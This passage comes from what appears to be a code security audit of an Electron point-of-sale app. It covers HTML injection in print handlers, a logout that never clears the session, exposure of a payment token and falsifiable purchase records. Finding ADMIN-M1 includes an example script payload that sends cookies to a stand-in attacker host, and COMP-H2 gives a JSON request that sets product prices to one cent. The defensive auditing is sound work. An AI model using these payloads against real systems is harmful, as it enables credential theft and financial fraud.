`printerName` is a renderer-supplied IPC parameter injected directly into a `data:text/html,` URL with no HTML escaping and no `encodeURIComponent` wrapping. The `data:text/html,` URL scheme sends the raw string to the browser engine as HTML source.

**BrowserWindow security defaults (Electron 28):**
`testWin` is created with `new BrowserWindow({ show: false })` — no `webPreferences` specified. Electron 28 defaults: `contextIsolation: true`, `nodeIntegration: false`. Script execution in `testWin` is sandboxed from Node.js APIs.

**What is injectable:**
- HTML elements: `<script>`, `<img onerror>`, `<iframe>`
- CSS: `<style>` for print layout manipulation
- Web API access via injected scripts (fetch, localStorage, etc.)
- Arbitrary print content via DOM manipulation

**Cross-layer verification:**
- `printerName` comes from the renderer IPC payload directly.
- `preload.js` line 23: `"test-print"` is in `validInvokeChannels` — accessible to all renderers.
- `deviceName: printerName || undefined` (line 278) is passed to the Electron print API separately and is not an injection surface (it's a string to a native API, not HTML).

**Impact:** A renderer supplying `printerName = "</p><script>fetch('http://attacker.com/?d='+document.cookie)</script>"` or any HTML payload causes the injected markup to execute in the `testWin` renderer context. While `contextIsolation: true` prevents Node.js access, web APIs remain available. Additionally, the attacker fully controls the print output: arbitrary content can be printed on the thermal printer.

**Why it matters:** The injection surface is small (printer name) and `testWin` is non-interactive. But this is the same structural pattern as `imprimir-ticket` (ADMIN-M2), which has a larger injection surface (`recibo` — the entire receipt text).

---

### ADMIN-M2 · HTML injection in `imprimir-ticket` — `${recibo}` unescaped in `<pre>` element, loaded via `data:` URL

**Severity:** MEDIUM

**Evidence:**

```js
// admin-handlers.js:337–376
const htmlRecibo = `
<html>
<head><meta charset="UTF-8"><style>...</style></head>
<body>
  <pre>${recibo}</pre>
</body>
</html>`;

await ticketWin.loadURL(
  `data:text/html;charset=utf-8,${encodeURIComponent(htmlRecibo)}`
);
```

`recibo` (renderer-supplied IPC parameter) is injected raw into the `<pre>` element before `encodeURIComponent` is applied to the URL. The sequence is:

1. `htmlRecibo` string is built — `recibo` is raw inside `<pre>...</pre>`.
2. `encodeURIComponent(htmlRecibo)` URL-encodes the HTML string for the `data:` URL transport.
3. The browser decodes the URL and receives the HTML with `recibo` already embedded unescaped.

`encodeURIComponent` encodes the HTML for safe transport in the URL, but it does **not** HTML-escape the content — `<`, `>`, `"` in `recibo` remain as HTML metacharacters after the browser decodes and parses the document.

**Cross-layer verification:**
- `imprimir-ticket` is in `validInvokeChannels` (preload.js line 40) — accessible to all renderers.
- `recibo` is a string constructed by the renderer. In normal operation it contains receipt text (product names, totals, dates). Product names can contain `<`, `>`, `&` characters if the business sells products with those names.
- `ticketWin` created with `new BrowserWindow({ show: false })` — same defaults as `testWin`: `contextIsolation: true`, `nodeIntegration: false`.

**Two distinct impacts:**

1. **Functional correctness:** In normal operation, product names or descriptions containing `&`, `<`, `>` will be misrendered on the printed ticket. `AT&T` becomes `AT` (HTML entity truncation). `<Especial>` causes the element to break. No escaping means valid business data can corrupt the receipt layout.

2. **Intentional injection:** A compromised or malicious renderer can inject `</pre><script>...</script>` or any HTML, executing in the `ticketWin` context with access to web APIs, or controlling the content of what gets physically printed.

**Why it matters:** Unlike `test-print`, the `recibo` string is the full receipt — it will always contain characters that have HTML meaning in a real business (currency symbols, `&`, fractions). The functional correctness issue affects every printed receipt containing such characters.

---

### ADMIN-M3 · `bcrypt` (native) vs `bcryptjs` (pure JS) — Electron ABI mismatch risk and library inconsistency

**Severity:** MEDIUM

**Evidence:**

```js
// admin-handlers.js:3
const bcrypt = require("bcrypt");      // native C++ addon — npm package "bcrypt"

// admin-handlers.js:68–69 (password update path)
const salt = await bcrypt.genSalt(10);
userToUpdate.password = await bcrypt.hash(cleanPassword, salt);

// admin-handlers.js:76–77 (user create path)
const salt = await bcrypt.genSalt(10);
const hashedPassword = await bcrypt.hash(cleanPassword, salt);
```

```js
// src/database/models/Usuario.js:3
const bcrypt = require('bcryptjs');    // pure JS — npm package "bcryptjs"

// Usuario.js:81–83
Usuario.prototype.validPassword = async function (plain) {
  return bcrypt.compare(plain, this.password);  // uses bcryptjs
};
```

```js
// session-handlers.js:25
const ok = await user.validPassword(plainPass);  // dispatches to bcryptjs.compare
```

**Cross-layer verification:**

Password creation path (`admin-handlers.js` → `bcrypt.hash`) and password verification path (`session-handlers.js` → `validPassword` → `bcryptjs.compare`) use different libraries.

**Hash compatibility (confirmed):** Both `bcrypt` and `bcryptjs` produce standard bcrypt hashes in `$2b$` format. They are mutually compatible: a hash produced by `bcrypt.hash` is correctly verified by `bcryptjs.compare`. Existing user accounts are not broken by this inconsistency. **Login works correctly.**

**ABI risk (confirmed):** The `bcrypt` package is a native Node.js addon (`bcrypt.node` binary). In Electron, native addons must be compiled against the Electron headers — not the system Node.js headers. This requires `electron-rebuild` to be run after `npm install`. If `bcrypt` was installed with a standard `npm install` (compiled for Node.js ABI), `require("bcrypt")` throws:

```
Error: The module 'bcrypt.node' was compiled against a different Node.js version
```

This error propagates at module load time. If `registerAdminHandlers` is called and `require("bcrypt")` at line 3 throws, the entire `admin-handlers.js` module fails to load, and **all admin handlers are silently absent** — `save-user`, `delete-user`, `get-user-by-id`, all empleado and gasto fijo handlers, and the print handlers are never registered.

**Why it matters:** The hash compatibility means no functional login bug. But the ABI risk means user management can silently fail on any packaging or deployment where `electron-rebuild` was not run or ran incorrectly. The `bcryptjs` import elsewhere (models, common-handlers if any) would continue working because it has no native dependency. Only admin-handlers would break.

---

### ADMIN-M4 (cross-layer) · `get-user-session` returns `mp_access_token` to the renderer

**Severity:** MEDIUM

**Evidence:**

```js
// session-handlers.js:49–65
ipcMain.handle("get-user-session", async () => {
  if (!activeUserId) return null;
  const user = await Usuario.findByPk(activeUserId, {
    attributes: { exclude: ["password"] },   // only password excluded
    raw: true,
  });
  ...
  return user;  // full user object returned
});
```

`attributes: { exclude: ["password"] }` excludes only the password hash. The returned `user` object is a raw Sequelize result containing every other field on the `Usuario` model, including:

- `mp_access_token` — live MP production credential
- `mp_user_id` — MP account identifier
- `mp_pos_id` — MP POS terminal identifier
- `config_recargo_credito` — credit surcharge rate
- `config_descuento_efectivo` — cash discount rate
- `config_balanza` — scale configuration (JSON)
- `config_arqueo_caja` — cash session configuration (JSON)

`preload.js` line 7: `"get-user-session"` is in `validInvokeChannels`. The renderer calls `window.electronAPI.invoke("get-user-session")` and receives the full admin user record on every session check.

**Cross-layer verification:**
- `Usuario.js:41`: `mp_access_token: { type: DataTypes.STRING }` — plaintext, no encryption.
- `session-handlers.js:52–55`: `findByPk` with only password excluded, then `return user` — confirmed.
- `preload.js:7`: channel exposed — confirmed.
- MP-L1 (from Pass 2): `scopes.withPassword: { attributes: {} }` fetches all fields including `mp_access_token` for the login call at session-handlers.js:20, but the return value is `{ success: true }` only — NOT the full user object. So `scope('withPassword')` does not expose the token to the renderer. This finding (`get-user-session`) is the confirmed token exposure path.

**Impact:** The renderer holds a live MP access token on every authenticated session. Any JavaScript executing in the main renderer context (including any injected scripts from the HTML injection findings ADMIN-M1/M2) has access to this token via `window.electronAPI.invoke("get-user-session")`. Combined with MP-H1 (open POS proxy) and MP-H3 (refund with renderer-supplied amount), the renderer already has the tools to perform MP operations — `get-user-session` confirms it also has direct token access.

**Why this is noted here:** The finding originates in `session-handlers.js` but the evidence required reading that file. It will be formally documented in the session-handlers audit pass.

---

### ADMIN-L1 · `permisos` array stored without content validation against known module IDs

**Severity:** LOW

**Evidence:**

```js
// admin-handlers.js:57
const permsArray = Array.isArray(permisos) ? permisos : [];
// ...
await Usuario.create({ ..., permisos: permsArray });
```

`permisos` is checked to be an array but individual elements are not validated against the hardcoded module list returned by `get-app-modules` (lines 30–42):

```js
["caja", "reportes", "productos", "insumos", "proveedores", "clientes",
 "cuentas_corrientes", "etiquetas", "mp_transactions", "dashboard"]
```

A renderer can store arbitrary strings as permissions. In `common-handlers.js`, `userPermissions.includes(moduleId)` is used for sidebar filtering — extra permissions beyond the known list have no effect on the sidebar since `moduleId` values come from the hardcoded list. However, any other code that iterates `permisos` directly (unverified in remaining files) could behave unpredictably.

---

### ADMIN-L2 · No minimum password length or complexity requirement

**Severity:** LOW

**Evidence:**

```js
// admin-handlers.js:73–77
if (!cleanPassword) {
  return { success: false, message: "La contraseña es obligatoria para usuarios nuevos." };
}
const salt = await bcrypt.genSalt(10);
const hashedPassword = await bcrypt.hash(cleanPassword, salt);
```

`!cleanPassword` only rejects empty/falsy strings. A one-character password (e.g., `"a"`) passes this check and is hashed and stored. No minimum length, no complexity rules (uppercase, digit, symbol). Combined with the absence of rate limiting on `login-attempt` (separate finding for session-handlers pass), weak passwords provide negligible resistance to brute force.

---

### ADMIN-L3 · `monto` in `save-gasto-fijo` accepts negative values — corrupts profitability reports

**Severity:** LOW

**Evidence:**

```js
// admin-handlers.js:213
monto: Number.isFinite(+monto) ? +monto : 0,
```

No lower-bound check. `monto: -5000` is stored as a valid `GastoFijo`. In `registerReportesHandlers.js`, `GastoFijo.sum("monto", { where: { createdAt: ... } })` sums all gastos — a negative value subtracts from reported expenses and inflates calculated profitability. This is the same class as M-8 (negative cash amounts) from Wave 1.

---

### ADMIN-L4 · `sueldo` in `save-empleado` accepts negative values — corrupts profitability reports

**Severity:** LOW

**Evidence:**

```js
// admin-handlers.js:162
sueldo: Number.isFinite(+sueldo) ? +sueldo : 0,
```

Same pattern. `sueldo: -10000` stored as a valid salary. `Empleado.sum("sueldo")` in `registerReportesHandlers.js` sums all salaries without a period filter — a negative salary reduces reported total salary costs, inflating profitability across all date ranges permanently.

---

### ADMIN Summary

| ID | Severity | Description |
|----|----------|-------------|
| ADMIN-H1 | HIGH | No server-side authorization on admin handlers + `rol` accepts any string → any authenticated user can escalate to admin |
| ADMIN-M1 | MEDIUM | `${printerName}` unescaped in `data:text/html` URL in `test-print` |
| ADMIN-M2 | MEDIUM | `${recibo}` unescaped in `<pre>` element in `imprimir-ticket` — also breaks receipts with `&`, `<`, `>` in product names |
| ADMIN-M3 | MEDIUM | `bcrypt` native addon vs `bcryptjs` pure JS — ABI mismatch silently disables all admin handlers if rebuild not run |
| ADMIN-M4 | MEDIUM (cross-layer) | `get-user-session` returns `mp_access_token` to renderer — confirmed via session-handlers.js |
| ADMIN-L1 | LOW | `permisos` array elements not validated against known module IDs |
| ADMIN-L2 | LOW | No minimum password length or complexity requirement |
| ADMIN-L3 | LOW | `monto` (GastoFijo) accepts negative values — inflates profitability reports |
| ADMIN-L4 | LOW | `sueldo` (Empleado) accepts negative values — inflates profitability reports |

**Total: 1 HIGH, 4 MEDIUM (1 cross-layer), 4 LOW**

**Next recommended audit target: `src/ipc-handlers/session-handlers.js`**

Rationale: `session-handlers.js` is now the highest-priority unaudited file. Three cross-layer findings from prior passes point directly at it: (1) ADMIN-M4 confirmed that `get-user-session` exposes `mp_access_token` to the renderer — this needs full documentation in its primary file; (2) ADMIN-H1 establishes that `activeUserId` in `session-handlers.js` is the only session state in the system, yet it is never consulted by other handlers — the scope and consequences of this need formal tracing; (3) MP-L1 from Pass 2 flagged `scope('withPassword')` as potentially leaking credentials — Pass 3 partially resolved this (the login return is `{ success: true }` only) but the full login flow, logout behavior, and multi-window session state require formal analysis. Additionally, the no-rate-limiting finding flagged during recon needs confirmation with line-level evidence.

---

---

## Pass 4 — Formal Audit: `src/ipc-handlers/session-handlers.js`

**Date:** 2026-04-08  
**Cross-layer files read:** `session-handlers.js` (84 lines), `main.js` (586 lines), `renderer/preload.js` (163 lines), `renderer/js/navbar-loader.js` (207 lines), `src/database/models/Usuario.js` (86 lines — previously read)  
**Method:** Full static analysis + execution-path tracing (logout signal routing, session state lifecycle, renderer data consumption). All findings confirmed at the code level; assumptions about unread renderer HTML are explicitly flagged.

---

### SES-H1 · The actual logout path never clears `activeUserId` — session persists after every logout

**Severity:** HIGH

**Evidence — two logout registrations, one for each IPC mechanism:**

```js
// main.js:466–480, 482
const handleLogout = () => {
  if (mainWindow) mainWindow.close();
  [qrWindow].forEach((win) => { if (win) win.close(); });
  if (!loginWindow || loginWindow.isDestroyed()) {
    createLoginWindow();
  } else {
    loginWindow.focus();
  }
  // activeUserId is never touched
};
ipcMain.on("logout", handleLogout);          // ← handles ipcRenderer.send("logout")

// session-handlers.js:69–80
ipcMain.handle("logout", async () => {
  activeUserId = null;                        // ← correctly clears session
  BrowserWindow.getAllWindows().forEach((win) => { if (!win.isDestroyed()) win.close(); });
  createLoginWindow();
  return { success: true };
});                                            // ← handles ipcRenderer.invoke("logout")
```

**Evidence — only `ipcRenderer.send("logout")` is reachable from the renderer:**

```js
// renderer/preload.js:113–120
const validSendChannels = [
  "logout",          // ← exposed via ipcRenderer.send()
  ...
];

// validInvokeChannels (lines 4–111): "logout" is absent
// → window.electronAPI.invoke("logout") is blocked by preload
```

```js
// renderer/js/navbar-loader.js:129
sidebarLogoutBtn?.addEventListener("click", () => window.electronAPI.send("logout"));
```

The logout button calls `electronAPI.send("logout")` → `ipcRenderer.send("logout")` → `ipcMain.on("logout", handleLogout)`. This path never calls `activeUserId = null`.

`ipcMain.handle("logout")` in session-handlers.js is only reachable via `ipcRenderer.invoke("logout")`. Because `"logout"` is absent from `validInvokeChannels`, `window.electronAPI.invoke("logout")` is rejected by the preload bridge. With `contextIsolation: true` (Electron 28 default), direct `ipcRenderer` access from renderer JS is impossible. **`ipcMain.handle("logout")` is unreachable dead code in the current configuration.**

**Cross-layer verification:**

| Layer | State after logout |
|---|---|
| `session-handlers.js` | `activeUserId` = previous user's ID (not cleared) |
| `main.js handleLogout` | Windows closed, login window created — no session state |
| `get-user-session` | Returns previous user's full record if called |
| `navbar-loader.js` | Called on next authenticated page load — reads stale session |

**Confirmed impact:**
1. After every logout, `activeUserId` retains the previous user's UUID.
2. Any subsequent call to `get-user-session` (e.g., from any window that loads `navbar-loader.js`) returns the previous user's full data record including their `mp_access_token` and all configuration fields.
3. `window.APP_SESSION` (see SES-M2) is populated with the previous user's data in the new window context until the stale session is detected or a new login overwrites `activeUserId`.

**Assumed but unconfirmed:** Whether the login page renderer calls `get-user-session` to check for an active session and auto-redirect. If it does, a new operator at the same terminal would bypass the login form and enter the application as the previous user. This assumption requires reading the login window's HTML/JS files (not yet audited).

**Why it matters:** Logout is the primary session-end mechanism. The invariant "after logout, the session must be invalidated" is violated on the only reachable logout code path. The correct implementation exists in `ipcMain.handle("logout")` but it is dead code. The gap is structural — not a runtime failure, but a routing failure between what was implemented and what the preload exposes.

---

### SES-M1 · No brute-force protection on `login-attempt` — no rate limiting, lockout, or attempt counter

**Severity:** MEDIUM

**Evidence:**

```js
// session-handlers.js:10–46
ipcMain.handle("login-attempt", async (event, payload = {}) => {
  try {
    const loginName = String(payload.nombre ?? payload.username ?? "").trim();
    const plainPass = String(payload.password ?? "").trim();
    if (!loginName || !plainPass) {
      return { success: false, message: "Usuario o contraseña incorrectos." };
    }
    const user = await Usuario.scope("withPassword").findOne({ where: { nombre: loginName } });
    if (!user || !user.password) {
      return { success: false, message: "Usuario o contraseña incorrectos." };
    }
    const ok = await user.validPassword(plainPass);   // bcryptjs.compare — ~70–100ms
    ...
  }
});
```

No attempt counter, no per-username lockout, no delay injection after failures, no CAPTCHA, no IP-based throttle (not applicable in Electron — IPC has no IP), no time-window limit.

**Cross-layer verification:**
- `"login-attempt"` is in `preload.js:6` (`validInvokeChannels`) — accessible to all renderers.
- `Usuario` model has no `loginAttempts` or `lockedUntil` field.
- No middleware between the preload and the handler.

**Natural throttle is insufficient:** `bcryptjs.compare` on a `$2b$10$` hash takes approximately 70–100 ms on typical hardware. This allows approximately 10 sequential attempts per second per call. However:
1. `ipcMain.handle` is async — multiple concurrent `invoke` calls are possible from the same renderer context. Parallelizing 50 calls yields ~500 password attempts per second.
2. The username enumeration timing is observable: a valid username takes ~100ms (bcrypt run); an invalid username returns immediately after `findOne` returns null. An attacker can enumerate which usernames exist before brute-forcing passwords.

**Why it matters:** The only users of this application are the operator and any staff granted accounts. The attack requires physical machine access or a compromised renderer. Within those constraints, weak passwords (ADMIN-L2 — no complexity requirement) are trivially brute-forced with no lockout.

---

### SES-M2 · `get-user-session` returns the full admin record to the renderer — includes `mp_access_token` and all config fields

**Severity:** MEDIUM *(primary documentation; cross-referenced as ADMIN-M4)*

**Evidence:**

```js
// session-handlers.js:49–66
ipcMain.handle("get-user-session", async () => {
  if (!activeUserId) return null;
  try {
    const user = await Usuario.findByPk(activeUserId, {
      attributes: { exclude: ["password"] },   // only password excluded
      raw: true,
    });
    if (!user) { activeUserId = null; return null; }
    return user;   // ← full user record returned
  } ...
});
```

`attributes: { exclude: ["password"] }` excludes only `password`. All other columns in `Usuario` are returned as a raw object. From `Usuario.js`, these include:

| Field | Sensitivity |
|---|---|
| `mp_access_token` | Live MP production credential |
| `mp_user_id` | MP account identifier |
| `mp_pos_id` | MP POS terminal ID |
| `config_recargo_credito` | Credit surcharge rate (financial config) |
| `config_descuento_efectivo` | Cash discount rate (financial config) |
| `config_balanza` | Scale hardware config (JSON) |
| `config_arqueo_caja` | Cash session config (JSON) |
| `permisos` | User permission list (JSON) |

**Cross-layer confirmation — renderer consumption:**

```js
// renderer/js/navbar-loader.js:24–30
const [user, config] = await Promise.all([
  window.electronAPI.invoke("get-user-session"),
  window.electronAPI.invoke("get-admin-config"),
]);
if (!user || !user.id) throw new Error("Sesión inválida.");

window.APP_SESSION = { user, config: config || {} };
```

The full user object is stored in `window.APP_SESSION` — a global variable in the renderer's JS scope. `window.APP_SESSION.user.mp_access_token` contains the live MP token.

**Impact of `window.APP_SESSION`:**
1. **DevTools access:** With Electron DevTools available (default), any operator at the terminal can open the console and read `window.APP_SESSION.user.mp_access_token` directly.
2. **Injected script access:** Any JS injected into the renderer context (via the HTML injection vectors ADMIN-M1/M2, or any XSS in dynamically loaded content) has access to this global object.
3. **Renderer-to-main forwarding:** The renderer already has the token in memory and can use it directly in any MP IPC call (MP-H1 established that `get-mp-pos-list` accepts renderer-supplied tokens).

**Why it matters:** The MP access token's confidentiality is entirely dependent on the renderer's integrity. There is no layered protection — the token reaches the renderer on every page load and sits in a global variable. This inverts the intended security model for a credential that authorizes real financial transactions.

---

### SES-L1 · `scope('withPassword')` over-fetches — all user fields retrieved when only `password` and `id` are needed

**Severity:** LOW

**Evidence:**

```js
// session-handlers.js:20
const user = await Usuario.scope("withPassword").findOne({ where: { nombre: loginName } });

// src/database/models/Usuario.js:59–61
scopes: {
  withPassword: { attributes: {} }   // empty attributes = all fields, no exclusions
}
```

`scope('withPassword')` with `attributes: {}` overrides the `defaultScope`'s `{ exclude: ['password'] }`. The result is a full user record — `password`, `mp_access_token`, `mp_user_id`, `mp_pos_id`, all configs — fetched from the DB.

After line 20, the handler only uses:
- `user.password` — via `user.validPassword(plainPass)` (which calls `bcryptjs.compare`)
- `user.id` — assigned to `activeUserId`

All other fetched fields are discarded. The login response is `{ success: true }` — no user data is forwarded to the renderer.

**Cross-layer verification:** The over-fetch is confirmed benign in the login flow — the `user` object is not logged or returned. But the scope design creates latent risk: any future handler that calls `scope('withPassword').findOne(...)` and logs or forwards the result will expose the full credential set. The scope name implies selective inclusion ("add password") but its implementation means total exposure.

---

### SES-L2 · Dual logout registrations with divergent behavior — structural confusion

**Severity:** LOW

**Evidence:**

```js
// main.js:482
ipcMain.on("logout", handleLogout);     // for ipcRenderer.send — closes windows only

// session-handlers.js:69
ipcMain.handle("logout", async () => { // for ipcRenderer.invoke — clears session + closes windows
  activeUserId = null;
  ...
});
```

Two registrations for the same channel name, using different IPC mechanisms:
- `ipcMain.on` listens for fire-and-forget `ipcRenderer.send` messages
- `ipcMain.handle` listens for request-reply `ipcRenderer.invoke` calls

These do not conflict at the IPC level (they use separate dispatch queues), but they represent two distinct logout implementations that diverge on the most critical operation: session invalidation. The dead-code path has the correct implementation; the live path has the omission. This is the root cause of SES-H1.

---

### SES-L3 · `login-attempt` accepts both `payload.nombre` and `payload.username` — undocumented dual-key

**Severity:** LOW

**Evidence:**

```js
// session-handlers.js:13
const loginName = String(payload.nombre ?? payload.username ?? "").trim();
```

The `??` chain accepts the login name from either `payload.nombre` (primary) or `payload.username` (fallback). When both are present, `payload.nombre` wins because `??` short-circuits on non-nullish values.

`admin-handlers.js:78` stores the user field as `nombre`: `await Usuario.create({ nombre: cleanNombre, ... })`. The `DB column is `nombre`. The DB lookup is `where: { nombre: loginName }`. There is no `username` field in `Usuario`.

The dual-key is a backwards-compatibility artifact — no harm, but it adds to the ambiguity of the login interface contract. If a renderer sends `{ username: "admin", nombre: "wrong" }`, `nombre` takes precedence and `"wrong"` is used.

---

### SES Summary

| ID | Severity | Description |
|----|----------|-------------|
| SES-H1 | HIGH | `activeUserId` never cleared on actual logout path — `ipcMain.handle("logout")` (which clears it) is dead code; `ipcMain.on("logout")` (the live path) skips session invalidation |
| SES-M1 | MEDIUM | No brute-force protection on `login-attempt` — no rate limiting, lockout, or attempt counter |
| SES-M2 | MEDIUM | `get-user-session` returns full user record to renderer including `mp_access_token`; stored in `window.APP_SESSION` global by `navbar-loader.js` |
| SES-L1 | LOW | `scope('withPassword')` fetches all user fields when only `password` and `id` are needed |
| SES-L2 | LOW | Dual logout registrations (`ipcMain.on` / `ipcMain.handle`) with divergent behavior — root cause of SES-H1 |
| SES-L3 | LOW | `login-attempt` accepts both `payload.nombre` and `payload.username` — undocumented fallback |

**Total: 1 HIGH, 2 MEDIUM, 3 LOW**

---

**Next recommended audit target: `src/ipc-handlers/compras-handlers.js`**

Rationale: `compras-handlers.js` carries the two highest-priority unresolved financial integrity findings from the reconnaissance phase: (1) `UsuarioId` is taken from the renderer payload rather than from the authenticated session — every purchase is attributed to a renderer-declared user ID, not the session-verified user, and no cross-check against `activeUserId` exists; (2) the `actualizarPrecioVenta` flag from the renderer can permanently overwrite `Producto.precioVenta` with the purchase's unit cost, which directly affects all future sales prices without any server-side guard. These two findings compound each other: a renderer can attribute unauthorized purchases to any user and simultaneously corrupt the product price catalog. Both require cross-layer verification against `Compra.js`, `DetalleCompra.js`, and `Producto.js` to confirm the full impact. `dashboard-handlers.js` / `registerReportesHandlers.js` are the next tier but their primary risk (non-period-filtered aggregations) is lower-impact than the purchasing trust violation.

---

---

## Pass 5 — Formal Audit: `src/ipc-handlers/compras-handlers.js`

**Date:** 2026-04-08  
**Cross-layer files read:** `compras-handlers.js` (166 lines), `src/database/models/Compra.js` (41 lines), `src/database/models/DetalleCompra.js` (30 lines), `src/database/associations.js` (223 lines — partial re-read), `src/database/models/Producto.js` (field grep — previously read in Wave 1)  
**Method:** Full static analysis + cross-layer financial trace (handler computation → model constraints → DB schema via associations). Transaction boundary, attribution chain, and price mutation path all traced end-to-end.

---

### COMP-H1 · `UsuarioId` is renderer-supplied — purchase attribution is freely falsifiable

**Severity:** HIGH

**Evidence:**

```js
// compras-handlers.js:12 (producto purchase)
const { proveedorId, nroFactura, UsuarioId, items, pago } = data || {};

// compras-handlers.js:48–49 (stored verbatim)
UsuarioId,
// → Compra.create({ ..., UsuarioId, ... }, { transaction: t })

// compras-handlers.js:93 (insumos purchase — identical pattern)
const { proveedorId, nroFactura, UsuarioId, items, pago } = data || {};
```

`UsuarioId` is destructured from the renderer IPC payload and inserted directly into `Compra.create`. There is no reference to `activeUserId` from `session-handlers.js`. No import of session state. No verification that the `UsuarioId` in the payload matches the ID of the authenticated user.

**Cross-layer verification:**

```js
// src/database/associations.js:144–152
Usuario.hasMany(Compra, {
  foreignKey: { name: "UsuarioId", type: DataTypes.UUID },
  onDelete: "SET NULL",
});
Compra.belongsTo(Usuario, {
  foreignKey: { name: "UsuarioId", type: DataTypes.UUID },
});
```

`onDelete: "SET NULL"` declares that `UsuarioId` is a nullable FK column (a user's deletion nullifies their purchase records). This means:
- `UsuarioId: null` is a valid value — renderer can submit unattributed purchases with no error
- `UsuarioId: <valid_uuid_of_any_user>` attributes the purchase to that user — renderer can impersonate any existing user
- `UsuarioId: <nonexistent_uuid>` triggers FK violation with `PRAGMA foreign_keys = ON` (now active in the fixed main.js) → rollback + error response. This is the only case that fails.

**`Compra.js` model confirmation:** `UsuarioId` is not declared in the model body — it is added by the `belongsTo` association (same pattern as L-11 for `Venta.UsuarioId` in Wave 1). No model-level format or range validation exists for this field.

**Impact:** Every purchase record's user attribution is controlled by the renderer. A cashier can:
1. Attribute their own purchases to the admin user (`UsuarioId: admin_uuid`)
2. Register purchases with `UsuarioId: null`, making them untraceable to any operator
3. Attribute purchases from other users to themselves or to any other user

In an accounting or audit context, purchase attribution is a financial record — who authorized what purchase, at what cost. Every `Compra` in the database can have a falsified attribution with no detectable error.

**Why it matters:** This is the purchasing-side equivalent of H-2 from Wave 1 (sale prices trusted from renderer). The same trust violation pattern now applies to an operation that creates financial obligations (supplier debt), increments inventory, and potentially mutates product prices. The attribution falsification is undetectable from within the application.

---

### COMP-H2 · `actualizarPrecioVenta` + `nuevoPrecioVenta` from renderer permanently overwrite `Producto.precioVenta` inside the purchase transaction

**Severity:** HIGH

**Evidence:**

```js
// compras-handlers.js:71–75
const updates = { precioCompra: costo };
if (it.actualizarPrecioVenta && toNum(it.nuevoPrecioVenta) > 0) {
  updates.precioVenta = toNum(it.nuevoPrecioVenta);
}
await Producto.update(updates, { where: { id: it.productoId }, transaction: t });
```

Both `it.actualizarPrecioVenta` (boolean flag) and `it.nuevoPrecioVenta` (target price) come from the renderer's `items` array. The handler:
1. Trusts the flag unconditionally — any renderer can set `actualizarPrecioVenta: true`
2. Validates only `nuevoPrecioVenta > 0` — no floor beyond `> 0`, no ceiling, no comparison against the current `precioVenta`, and no comparison against `costoUnitario`
3. Commits the price mutation inside the same transaction as stock increment and purchase record creation — the price change is atomic with the purchase

**Cross-layer verification (`Producto.js`):**

```js
// src/database/models/Producto.js:16
precioVenta: { type: DataTypes.FLOAT, defaultValue: 0, validate: { min: 0 } },
```

`validate: { min: 0 }` at the ORM layer prevents negative `precioVenta`. However:
- The handler's own `> 0` check already excludes values ≤ 0, so the ORM constraint adds no additional defense for this path
- No maximum bound exists at any layer
- No constraint ensures `precioVenta >= precioCompra` — a sale price below cost is accepted
- Phase 6 added `precio_oferta < precioVenta` validation in `guardar-producto`, but that validation does not apply to `Producto.update` called from `compras-handlers.js`

**Confirmed attack path — no speculation:**
1. Renderer invokes `registrar-compra-producto` with:
   ```json
   { "items": [{ "productoId": "<any_uuid>", "cantidad": 1, "costoUnitario": 1,
                 "actualizarPrecioVenta": true, "nuevoPrecioVenta": 0.01 }] }
   ```
2. The `> 0` check passes for `nuevoPrecioVenta: 0.01`
3. `Producto.update({ precioCompra: 1, precioVenta: 0.01 }, { where: { id } })` executes inside the transaction
4. All future sales of that product charge $0.01 — no record of the change, no error, `{ success: true }` returned

**Scope:** The `items` array is a loop — a single purchase can reset `precioVenta` to $0.01 for every product in the catalog if all product IDs are included.

**Why it matters:** `Producto.precioVenta` is the authoritative source for sale prices in `busqueda-inteligente` and `registrar-venta`. There is no server-side price lookup that overrides this value at sale time (H-2 from Wave 1 established that sale prices come from the renderer, not from a DB re-read). A corrupted `precioVenta` silently affects all subsequent sales. The corruption path is inside a transactional purchase operation — there is no separate "price audit log" or price-change event.

---

### COMP-M1 · `descuento` is uncapped — a value exceeding `subtotal` produces a negative `Compra.total` committed to the database

**Severity:** MEDIUM

**Evidence:**

```js
// compras-handlers.js:25–28
const subtotal = items.reduce((acc, it) => acc + toNum(it.cantidad) * toNum(it.costoUnitario), 0);
const descuento = toNum(pago?.descuento);
const recargo   = toNum(pago?.recargo);
const totalCompra = subtotal - descuento + recargo;
```

`toNum(pago?.descuento)` accepts any finite number including values larger than `subtotal`. No check `descuento <= subtotal` exists at any layer.

**Cross-layer verification (`Compra.js`):**

```js
// Compra.js:11–13
subtotal:  { type: DataTypes.FLOAT, allowNull: false },
descuento: { type: DataTypes.FLOAT, defaultValue: 0 },
total:     { type: DataTypes.FLOAT, allowNull: false },
```

`descuento` has `defaultValue: 0` and no `validate: { min: 0, max: ... }`. `total` has no `validate: { min: 0 }`. A negative `totalCompra` passes all ORM constraints and is committed.

**Consequences of negative `totalCompra`:**

| Downstream | Behavior |
|---|---|
| `estadoPago` | `montoAbonado (≥ 0) >= totalCompra (< 0)` → always evaluates to `"Pagada"` |
| `deudaGenerada` | `totalCompra - montoAbonado < 0` → guarded by `if (deudaGenerada > 0)` → **no proveedor debt increment** |
| `Compra.total` stored | Negative value committed — financial reporting is corrupted |
| `registerReportesHandlers.js` | `Compra.sum("total", { where: { fecha: ... } })` sums all `total` values including negatives — lowers reported purchase costs, inflates profitability |

**Impact:** A renderer submitting `pago.descuento: 10000` on a $100 purchase creates a `Compra` with `total: -9900` marked `"Pagada"`. The purchase record is committed with no error. The profitability report for the period understates purchase costs by $10,000 and inflates net profit accordingly.

---

### COMP-M2 · No server-side authorization — any authenticated renderer can register purchases, mutate stock, and trigger price updates

**Severity:** MEDIUM

**Evidence:**

Both handlers contain no role check or session verification:

```js
// compras-handlers.js:11
ipcMain.handle("registrar-compra-producto", async (_event, data) => {
  // no reference to activeUserId, no role guard
  ...
});
```

```js
// renderer/preload.js:83–84
"registrar-compra-insumos",
"registrar-compra-producto",
```

Both channels are in `validInvokeChannels`, exposed unconditionally to all renderer contexts. The `activeUserId` in `session-handlers.js` is never imported or checked.

**What a non-admin renderer can trigger via these handlers:**
- Create `Compra` records attributed to any user (COMP-H1)
- Increment stock for any product by any quantity
- Overwrite `Producto.precioCompra` for any product (always occurs — line 71)
- Overwrite `Producto.precioVenta` for any product (with `actualizarPrecioVenta: true` — COMP-H2)
- Increment `Proveedor.deuda` for any supplier

**Why it matters:** This is the purchasing-side instance of the general authorization gap (ADMIN-H1). Purchase registration has broader mutation scope than most other handlers because it touches four entities simultaneously (Compra, DetalleCompra, Producto, Proveedor) inside a single transaction.

---

